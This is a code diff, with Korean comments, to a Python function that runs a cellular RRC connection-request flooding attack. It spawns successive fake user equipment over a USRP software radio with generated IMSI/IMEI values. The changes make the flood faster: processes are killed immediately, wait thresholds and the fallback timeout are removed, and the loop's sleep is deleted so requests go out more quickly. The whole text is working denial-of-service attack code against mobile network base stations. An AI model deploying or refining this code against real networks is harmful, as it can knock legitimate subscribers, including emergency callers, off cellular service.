@@ -142,7 +142,7 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
     process_start_time = None
     current_log_file = None
     last_log_position = {}  # 각 로그 파일의 마지막 읽은 위치 저장
-    max_process_wait_time = 2.0  # 최후의 수단: 프로세스가 멈춰있을 때만 사용
+    # 타임아웃 제거: 로그 기반으로만 종료
     
     try:
         loop_count = 0
@@ -151,13 +151,9 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
             
             # 현재 프로세스가 없거나 종료되었으면 다음 UE 실행
             if current_process is None or current_process.poll() is not None:
-                # 이전 프로세스가 있으면 정리
+                # 이전 프로세스가 있으면 정리 (즉시 kill)
                 if current_process and current_process.poll() is None:
-                    try:
-                        current_process.terminate()
-                        current_process.wait(timeout=0.5)
-                    except:
-                        current_process.kill()
+                    current_process.kill()
                 
                 # IMSI/IMEI 생성 (UE ID는 계속 증가)
                 imsi, imei = generate_imsi_imei(ue_id, mcc, mnc)
@@ -250,11 +246,7 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                         if rrc_request_sent:
                             # RRC Request 전송 확인 → 즉시 종료하고 다음 UE로
                             if current_process.poll() is None:
-                                current_process.terminate()
-                                try:
-                                    current_process.wait(timeout=0.2)
-                                except:
-                                    current_process.kill()
+                                current_process.kill()
                             # 로그 위치 정보 정리
                             if current_log_file in last_log_position:
                                 del last_log_position[current_log_file]
@@ -262,14 +254,10 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                             process_start_time = None
                             current_log_file = None
                             continue
-                        elif rach_sent and elapsed > 0.3:
-                            # RACH 전송 후 0.3초 지났으면 다음으로 (RRC Request가 곧 올 것)
+                        elif rach_sent:
+                            # RACH 전송 감지 시 즉시 종료
                             if current_process.poll() is None:
-                                current_process.terminate()
-                                try:
-                                    current_process.wait(timeout=0.2)
-                                except:
-                                    current_process.kill()
+                                current_process.kill()
                             # 로그 위치 정보 정리
                             if current_log_file in last_log_position:
                                 del last_log_position[current_log_file]
@@ -277,14 +265,10 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                             process_start_time = None
                             current_log_file = None
                             continue
-                        elif cell_synced and elapsed > 0.5:
-                            # 셀 동기화 후 0.5초 지났으면 다음으로 (RRC Request가 곧 올 것)
+                        elif cell_synced:
+                            # 셀 동기화 감지 시 즉시 종료
                             if current_process.poll() is None:
-                                current_process.terminate()
-                                try:
-                                    current_process.wait(timeout=0.2)
-                                except:
-                                    current_process.kill()
+                                current_process.kill()
                             # 로그 위치 정보 정리
                             if current_log_file in last_log_position:
                                 del last_log_position[current_log_file]
@@ -292,14 +276,10 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                             process_start_time = None
                             current_log_file = None
                             continue
-                        elif pbch_failed and elapsed > 1.0:
-                            # PBCH 디코딩 실패이고 1.0초 이상 지났으면 다음으로
+                        elif pbch_failed and elapsed > 0.3:
+                            # PBCH 디코딩 실패이고 0.3초 이상 지났으면 다음으로
                             if current_process.poll() is None:
-                                current_process.terminate()
-                                try:
-                                    current_process.wait(timeout=0.2)
-                                except:
-                                    current_process.kill()
+                                current_process.kill()
                             # 로그 위치 정보 정리
                             if current_log_file in last_log_position:
                                 del last_log_position[current_log_file]
@@ -322,27 +302,9 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                         current_log_file = None
                         continue
             
-            # 최후의 수단: 타임아웃 체크 (로그 기반 종료가 실패했을 때만)
-            if current_process and process_start_time:
-                elapsed = time.time() - process_start_time
-                if elapsed > max_process_wait_time:
-                    # 타임아웃: 다음 UE로 이동 (로그에서 종료 조건을 찾지 못한 경우)
-                    if current_process.poll() is None:
-                        current_process.terminate()
-                        try:
-                            current_process.wait(timeout=0.5)
-                        except:
-                            current_process.kill()
-                    # 로그 위치 정보 정리
-                    if current_log_file in last_log_position:
-                        del last_log_position[current_log_file]
-                    current_process = None
-                    process_start_time = None
-                    current_log_file = None
-                    continue
+            # 최후의 수단: 타임아웃 체크 제거 (로그 기반으로만 종료)
             
-            # 짧은 대기 후 다시 확인 (CPU 부하 방지)
-            time.sleep(0.05)
+            # 대기 없이 계속 확인 (더 빠른 전송)
             
     except KeyboardInterrupt:
         pass
